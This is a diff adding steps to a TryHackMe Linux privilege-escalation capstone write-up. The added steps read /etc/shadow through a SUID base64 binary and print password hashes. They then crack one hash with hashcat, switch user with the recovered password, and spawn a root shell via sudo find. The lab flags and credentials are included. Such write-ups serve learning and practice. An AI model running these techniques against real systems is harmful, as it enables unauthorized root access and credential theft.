@@ -523,6 +523,7 @@ THM-89384012
 **Flag 7**: `THM-89384012`
 ## Capstone Challenge
 ### What is the content of the `flag1.txt` file?
+1. Find SUID binaries:
 ```bash
 $ ssh leonard@10.10.147.252
 Password: Penny123
@@ -562,6 +563,9 @@ $ bash
 37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
 18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
 18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap
+```
+2. Get password hash by encoding and decoding with [GTFOBins `base64` method](https://gtfobins.github.io/gtfobins/base64/#suid):
+```bash
 [leonard@ip-10-10-147-252 ~]$ base64 /etc/shadow | base64 --decode
 root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
 bin:*:18353:0:99999:7:::
@@ -616,6 +620,7 @@ smmsp:!!:18785::::::
 nscd:!!:18785::::::
 missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
 ```
+3. Break `missy`'s password hash with `hashcat`:
 ```bash
 $ hashcat -O -D 2 -m 1800 '$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/' rockyou.txt
 $6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:Password1
@@ -635,6 +640,32 @@ Restore.Point....: 3074/14344384 (0.02%)
 Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4992-5000
 Candidates.#2....: theking -> sparks
 ```
+4. Use `missy`'s privilages and read the flag:
+```bash
+[leonard@ip-10-10-147-252 ~]$ su missy
+Password: Password1
+[missy@ip-10-10-147-252 leonard]$ find / -name flag1.txt 2>/dev/null
+/home/missy/Documents/flag1.txt
+[missy@ip-10-10-147-252 leonard]$ cat /home/missy/Documents/flag1.txt
+THM-42828719920544
+```
 
+**Flag 1**: `THM-42828719920544`
 ### What is the content of the `flag2.txt` file?
+1. List `missy`'s `sudo` binary access:
+```bash
+[missy@ip-10-10-147-252 leonard]$ sudo -l
+User missy may run the following commands on ip-10-10-147-252:
+    (ALL) NOPASSWD: /usr/bin/find
+```
+2. Use [GTFOBins `find` method](https://gtfobins.github.io/gtfobins/find/#sudo) to gain root access and read the flag:
+```bash
+[missy@ip-10-10-147-252 leonard]$ sudo find . -exec /bin/sh \; -quit
+# bash
+[root@ip-10-10-147-252 leonard]# find / -name flag2.txt 2>/dev/null
+/home/rootflag/flag2.txt
+[root@ip-10-10-147-252 leonard]# cat /home/rootflag/flag2.txt
+THM-168824782390238
+```
 
+**Flag 2**: `THM-168824782390238`
